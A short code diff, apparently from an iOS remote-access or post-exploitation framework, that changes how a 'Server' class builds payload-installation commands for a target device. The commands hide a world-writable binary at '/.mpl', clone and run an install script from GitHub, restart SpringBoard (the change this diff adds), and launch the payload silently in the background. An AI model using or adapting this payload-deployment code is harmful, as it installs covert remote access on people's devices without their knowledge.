@@ -125,7 +125,7 @@ class Server:
             "chmod 777 /tmp/tmpmpl;"+\
             "mv /tmp/tmpmpl /.mpl;"+\
             "git clone https://github.com/entynetproject/mouse-substrate.git;"+\
-            "cd mouse-substrate && chmod +x install.sh && ./install.sh;"+\
+            "cd mouse-substrate && chmod +x install.sh && ./install.sh && killall SpringBoard;"+\
             "/.mpl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
